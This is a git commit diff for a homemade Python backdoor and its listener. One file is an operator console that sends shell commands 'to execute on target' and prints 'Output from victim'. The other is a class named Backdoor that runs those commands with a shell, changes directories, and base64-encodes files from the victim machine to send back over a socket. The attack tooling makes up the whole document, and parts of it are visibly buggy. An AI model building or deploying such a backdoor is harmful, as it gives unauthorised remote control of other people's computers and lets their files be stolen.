9392c7cbf36ab248f75161f87449f9493d74ecb2
Ben Robbins <benro2211@gmail.com>
2022-03-16 23:08:15 -0400

    base64 all the things

--- listenerBind.py
+++ listenerBind.py
@@ -1,10 +1,10 @@
-import socket, sys, json, argparse, subprocess
+import socket, sys, json, argparse, subprocess, traceback, base64, logging, time
 from sys import getsizeof
 from itertools import cycle
 import multiprocessing, time
 
 
-class fc:
+class fc: #ascii font color class
     rw = '\033[31;107m'
     r = '\033[38;5;196m'
     pv = '\033[38;5;206;48;5;57m'
@@ -18,7 +18,7 @@ class fc:
     b = '\033[38;5;45m'
 
 
-class Args:
+class Args: #take args (set to defaults on kali)
     
     
     def __init__(self):
@@ -31,8 +31,8 @@ class Args:
         self.ip = options.ip
         self.port = options.port
         
-    
-    def get_ip(self):
+
+    def get_ip(self): #kali resuable IP code
         pipecmd_ip = "/sbin/ip route | awk '/src/ { printf $9 }'"
         ip = subprocess.check_output(pipecmd_ip,shell=True)
         ip_decoded = ip.decode('utf-8')
@@ -42,12 +42,11 @@ class Args:
 
 class Listener:
     
-    
-    def __init__(self,ip,port):
-        spinner = multiprocessing.Process(target=self.spinner)
+    def __init__(self,ip,port): #set up socket listener, spinner, interrupt
+        spinner = multiprocessing.Process(target=self.spinner) #worked better for spinner, easily terminate a thread 
         #self.byteTotal = 0
-        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+        self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
+        self.listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #reuse address allows socket to bind
         self.listener.bind((str(ip),port)) #bind to this machine! 127.0.0.1 might work to? 
         self.listener.listen(0)
         print(f'Starting listener on address {fc.b}{ip}{fc.end} and port {fc.b}{port}{fc.end}.\n{fc.y}Waiting for connection...{fc.end}'.format(ip,port)) #add a threading spinner here
@@ -63,25 +62,28 @@ class Listener:
         print(f'{fc.g}Connection established with {fc.pink}{str(address[0])}{fc.end} on port {fc.pink}{str(address[1])}{fc.end}')
         print(f'Enter {fc.rw}\'bye\'{fc.end} to close connection')
     
-    
-    def sendStream(self,data):
+    def isBase64(self,string):
+        regEx = "^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$"
+        if string % 4 == 0:
+            #p
+            search = re.search(regEx,string)
+            if search:
+                return True
+        else:
+            return False
+
+    def sendStream(self,data):#base sender with json serialization
         jsData = json.dumps(data)
         self.connection.send(str(jsData).encode('utf-8'))
     
     
-    def spinner(self):
-        spinnerChars = ['-', '/', '|', '\\']
-        while True:
-            for char in cycle(spinnerChars):
-                print(f'{fc.pv}{char}{fc.end}',end='\r')
-                time.sleep(.2)
-
-    
     def recvStream(self):
+
         jsData = ''
         #print(getsizeof(jsData))
         while True:
             try:
+                print('Receiving data')
                 recvData = self.connection.recv(1024)
                 if isinstance(recvData,bytes):
                     recvData = recvData.decode()
@@ -91,49 +93,171 @@ class Listener:
                 jsData = jsData + recvData
                 return json.loads(jsData)
             except Exception as e:
-                print(f'{fc.rw}{e}{fc.end}\n{fc.wg}Incomplete stream, gathering remainder of data.{fc.end}')
+                print(f'{fc.rw}{e}{fc.end}')
                 continue
-                
+    
+    
+    def spinner(self):#spinner
+        spinnerChars = ['-', '/', '|', '\\']
+        while True:
+            for char in cycle(spinnerChars):
+                print(f'{fc.pv}{char}{fc.end}',end='\r')
+                time.sleep(.2)
+        
     
     def utf8len(self,string):
         return len(string.encode('utf-8'))
+    
+    def write_file(self,file,content):
+        print(type(content))
+        content = content['data']
+        print(content)
+        with open(file,'wb') as write_file:
+            write_file.write(base64.b64decode(content))
+        return (f'Successfully downloaded {file}')
+        
+
+    
+    
+    
+    
+    def writeFile(self,file,content):
+        charFiles = ['txt','py','docx','doc','log'] 
+        picFile = ['png','jpeg','jpg']
+        
+        #print(fileType) 
+        try:
+            fileType = file.split('.')[1]
+            if fileType in charFiles:
+                if isinstance(content,dict):
+                    #print(type(content))
+                    content = content['data']
+                    #print(content)
+                    if isinstance(content,str):
+                        content = content.encode()
+                    
+                    with open(file,'wb') as writeFile:
+                        writeFile.write(content) 
+                        #print(f'Downloaded file: {file}')
+                    return (f'Successfully downloaded {file}')
+                else:
+                    return ('Could not download file')
+            
+            elif fileType in picFile:
+                #print(file)
+                if isinstance(content,dict):
+                    content = content['data']
+                    #print(type(content))
+                with open(file,'wb') as writeFile:
+                    writeFile.write(base64.b64decode(content))
+                return (f'Successfully downloaded {file}')
+            
+            else:
+                print(logging.info('file ext'))
+                try:
+                    
+                    if isinstance(content,dict):
+                        content = content['data']
+                        print(f'Content data type from dict: {type(content)}')
+                        print('trying b64 decode')
+                        print(len(content))
+                        remainder = (len(content)%4)
+                        if remainder == 0:
+                            print('Divisiable by \'4\', likely base64 encoded.')
+
+                        try:
+                            content = base64.b64decode(content)
+                            print('Decoded string')
+                        
+                        except Exception as e:
+                            print(traceback.format_exc())
+                                                        
+                        print(len(content))
+                        if isinstance(content,str):
+                            content = content.encode()
+                    print(f'Content after b64 and encode: {type(content)}')
+                    
+                    with open(file,'wb') as writeFile:
+                        writeFile.write(content)
+                        return (f'Successfully downloaded {file}')                
+                
+                except Exception as e:
+                    print(traceback.format_exc())
+                    return 'Could not download file'
+        
+        except Exception as e:
+            print(e)
 
 
     def executeCmd(self,cmd):
         #cmd = str(cmd).encode('utf-8')
         #print('executeCmd')
         #print(cmd)
+        time.sleep(1)
         self.sendStream(cmd)
+        #self.sendStream('\r\n')
         #result = self.connection.recv(1024)
         #result = result.decode()
+        time.sleep(1)
         return self.recvStream() #calling.executeCmd will return the result of the command sent by run()
 
 
     def run(self): #so my run() function will need to do the exit call logic, execCmd just needs to send and receive the command from run
         while True:
-            inputChecker = False
-            while inputChecker == False:
-                try:
-                    cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
-                    if cmd == '':
-                        print(f'{fc.rw}Command must not be blank!{fc.end}')
-                    else:
-                        inputChecker = True
-                    #print(cmd)
-                    cmd = cmd.split(' ')
-                    #print(cmd)
-                except KeyboardInterrupt:
-                    self.sendStream(['bye'])
-                    self.listener.close()
-                    exit()
 
+            #########################################REMOVE#BLANK#STRING#CHECKING########################################################
+            # #inputChecker = False
+            
+            # #while inputChecker == False:
+                
+            #     #try:
+            #         #cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
+            #         if cmd == '':
+            #             print(f'{fc.rw}Command must not be blank!{fc.end}')
+            #         else:
+            #             inputChecker = True
+            #         #print(cmd)
+            #         cmd = cmd.split(' ')
+            #         #print(cmd)
+            #     except KeyboardInterrupt:
+            #         self.sendStream(['bye'])
+            #         self.listener.close()
+            #         exit()
+            #########################################REMOVE#BLANK#STRING#CHECKING########################################################
 
-            if cmd[0] != 'bye':
-                result = self.executeCmd(cmd)
+            cmd = input(f'{fc.r}Enter command to execute on target:{fc.end}')
+            #print(cmd)
+            cmd = cmd.split(' ')
+            #print(cmd[0])
+            if cmd[0] == '':
+                print(cmd)
+                cmd[0] = "\r\n" 
+                result = self.executeCmd(cmd)   
                 print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
                 print(f'{fc.purple}#{fc.end}'*100)
                 print(f'{fc.b}{result}{fc.end}')
                 print(f'{fc.purple}#{fc.end}'*100)
+          
+            elif cmd[0] != 'bye':
+                            
+                if cmd[0] == 'download':
+                    try:
+                        print(f'{fc.purple}#{fc.end}'*100)
+                        print(f'{fc.b}{self.write_file(cmd[1],self.executeCmd(cmd))}{fc.end}')
+                        print(f'{fc.purple}#{fc.end}'*100)
+                    
+                    except IndexError:
+                        print('No argument for download, command not executed')
+
+                
+                else:
+
+                    result = self.executeCmd(cmd)   
+                    print(f'Output from victim, {fc.g}{self.utf8len(result)}{fc.end} bytes long')
+                    print(f'{fc.purple}#{fc.end}'*100)
+                    print(f'{fc.b}{result}{fc.end}')
+                    print(f'{fc.purple}#{fc.end}'*100)
+            
             else:
                 print(f'{fc.rw}Exit call received, closing connection{fc.end}')
                 self.sendStream(cmd)
@@ -141,17 +265,19 @@ class Listener:
                 exit() 
           
 
+##########################################################################RUN##########################################################################
+
+
 try:
     args = Args()
     listener = Listener(args.ip,args.port)
     listener.run()
 
 
-except Exception as e:
-    print(f'\tError: {fc.rw}{e}{fc.end}')
-    sys.exit()
+except Exception:
+    print(f'Fatal Error, quitting...\nError: {fc.rw}{traceback.format_exc()}{fc.end}')
 
-
+    
 except KeyboardInterrupt:
     print(f'{fc.rw}Interrupt caught, exiting...{fc.end}')
     sys.exit()
--- sendAndReceiveWListener.py
+++ sendAndReceiveWListener.py
@@ -1,4 +1,4 @@
-import subprocess, sys, socket, json, argparse, os
+import subprocess, sys, socket, json, argparse, os, base64, traceback, time
 
 
 class Args:
@@ -25,14 +25,14 @@ class Backdoor:
     
     def cd(self,path):
         try:
-            #print('path:',path)
+            print('path:',path)
             fullPath = path[1:] # path will be everything following cd command
-            #print('fullPath:',fullPath)
+            print('fullPath:',fullPath)
             fullPathJoin = ' '.join(fullPath)
-            #print('fullPathJoin:',fullPathJoin)
+            print('fullPathJoin:',fullPathJoin)
             os.chdir(str(fullPathJoin))
-            #print(os.curdir)
-            return f"Changing directory\n>>\"{path}\""
+            print(os.curdir)
+            return f"Changing directory\n>>\"{str(fullPathJoin)}\"\nCurrent Directory:\n{str(os.path.abspath(os.curdir))}"
         except PermissionError:
             self.sendStream('PermissionError, change directory command not accepted by target')
         except FileNotFoundError:
@@ -40,52 +40,183 @@ class Backdoor:
         except OSError:
             self.sendStream('OSError, change directory command not accepted by target')
             
-
+    
     def executeCmd(self,cmd):
-        cmd = subprocess.check_output(cmd,shell=True)
-        return cmd
+        try:
+            cmd = subprocess.check_output(cmd,shell=True)
+            return cmd
+        except subprocess.CalledProcessError as e:
+            return str(e)
     
     
     def sendStream(self,data):
-        jsData = json.dumps(data)
-        self.connection.send(str(jsData).encode('utf-8'))
+        #print(f'sendStream data type: {type(data)}')
+        if isinstance(data,str):
+
+            jsData = json.dumps(data)
+            #print(jsData)
+            self.connection.send(str(jsData).encode('utf-8'))
+        elif isinstance(data,dict): #using this for download function
+            print(type(data))
+            print(type(data['data']))
+            print(data['data'])
+            if isinstance(data['data'],bytes):
+                data['data'] = data['data'].decode()
+            print(type(data))
+            print(type(data['data']))
+            print(data['data'])
+            
+            #data = data['data'] #value of data
+            #print(f'sendStream dict data: {data}')
+            #print(type(data['data']))
+            
+            jsData = json.dumps(data)
+            #print(jsData)
+            self.connection.send(str(jsData).encode('utf-8'))
+
+        
+
+        # print(f'sendStream data type: {type(data)}')
+
+        # if isinstance(data,bytes):
+        #     data = data.decode()
+
+        # jsData = json.dumps(data)
+        # print(f'sendStream jsData type:{type(jsData)}')
+        # self.connection.send(jsData)
+        # #self.connection.send(str(jsData).encode('utf-8'))
+        
+
+        
 
 
     def recvStream(self):
+        time.sleep(1)
         jsData = ''
         while True:
             try:
                 recvData = self.connection.recv(1024)
-                recvData = recvData.decode()
+                recvData = recvData.decode() 
                 jsData = jsData + recvData
                 return json.loads(jsData)
             except Exception as e:
                 continue
 
+    def read_file(self,file):
+        data = {}
+        print('start of read_file basic')
+        try:
+            with open(file,'rb') as read_file:
+                value = read_file.read()
+            print(value)
+            value = base64.b64encode(value)
+            print(value,':',type(value))
+            data['data'] = value
+            print(data)
+            return data #dictionary for download 
+        except FileNotFoundError:
+            return 'FileNotFoundError'
+        
+    
+    def readFile(self,file):
+        
+        #defaultData = {'data':'Could not read file'}
+        noExt = {'data':'No file extension, Download not performed'}
+        print('Start of readFile Method')
+        charFiles = ['txt','py','docx','doc'] # add to this 
+        picFile = ['png','jpeg','jpg']
+        try:
+            fileType = file.split('.')[1]
+        except:
+            return noExt
+        print(f'File type: {fileType}')
+        try:
+            #fileType = self.cmdIn[1].split('.')[1]
 
+            if fileType in charFiles:  
+                data = {}
+                with open(file,'rb') as readFile:
+                    value = readFile.read()
+                data['data'] = value.decode()
+                return data
+            
+            elif fileType in picFile:
+                data = {}
+                with open(file, mode='rb') as readFile:
+                    value = readFile.read()
+                data['data'] = base64.encodebytes(value).decode('utf-8')
+                picData = data['data']
+                print(f'dict data type: {type(picData)}')
+                #print(data['data'])
+                print('json dict')
+                #print(json.dumps(data))
+                return data
+            else:
+                data = {}
+                with open(file,'rb') as readFile:
+                    value = readFile.read()
+                print(type(value))
+                try:
+
+                    print('Misc file read try')
+                    print(value[1:20])
+                    data['data'] = value.decode()
+                except:
+
+                    print('Misc file read except')
+                    #print(value[1:20])
+                    print(traceback.format_exc())
+                    data['data'] = base64.encodebytes(value).decode('utf-8')
+                    content = data['data']
+                    print(content[1:20])
+                return data
+                  
+            
+        
+        except FileNotFoundError:
+            print('file not found')
+            return 'FileNotFoundError'
+        except IndexError:
+            return 'IndexError'
+
+    
     def run(self):
         while True:
-            #print('run1')
-            cmdIn = self.recvStream()
-            #print(cmdIn)
-            #print('run2')
-            if cmdIn[0] == 'bye':
-                #print('bye')
+            print('run1')
+            self.cmdIn = self.recvStream()
+            print(self.cmdIn)
+            print('run2')
+            
+            if self.cmdIn[0] == 'bye':
+                print('bye')
                 self.connection.close()
                 exit()
-            elif cmdIn[0] == 'cd' and len(cmdIn) > 1:
-                #print('trying CD') #meaning cmdIn = ['cd','c:\\'] is len() = 2
-                cmdOut = self.cd(cmdIn) #must pass in the entire absolute path for the argument of cd
+            
+            elif self.cmdIn[0] == 'cd' and len(self.cmdIn) > 1:  #meaning cmdIn = ['cd','c:\\'] is len() = 2
+                print('trying CD') 
+                cmdOut = self.cd(self.cmdIn) 
                 self.sendStream(cmdOut)
+            
+            elif self.cmdIn[0] == 'download': #download function starting using read_file currently
+                
+                print('Trying download')
+                print(f'file cmd received: {self.cmdIn[1]}')
+                cmdOut = self.read_file(self.cmdIn[1]) # cmdIn[1] is the file test.txt, text.png, etc
+                print(f'readFile method complete')
+                print(type(cmdOut))
+                print(f'sending data: {cmdOut}')
+                self.sendStream(cmdOut)
+            
             else:   
-                #print('run3_PRE_TRY')
-                try:
-                    cmdOut = self.executeCmd(cmdIn)
-                except subprocess.CalledProcessError:
-                    self.sendStream('Subprocess Error, shell command not accepted by target')  
-                #print('run4_POST_TRY')
-                cmdOut = cmdOut.decode('utf-8')
+                print('Try3')
+                print('run3_PRE_TRY')
+                cmdOut = self.executeCmd(self.cmdIn)  
+                print(f'{cmdOut[1:20]},{type(cmdOut)}')
+                print('run4_POST_TRY')
+                if isinstance(cmdOut,bytes):
+                    cmdOut = cmdOut.decode('utf-8')
                 #print(cmdOut)
+                print(type(cmdOut))
                 self.sendStream(cmdOut)
                    
 
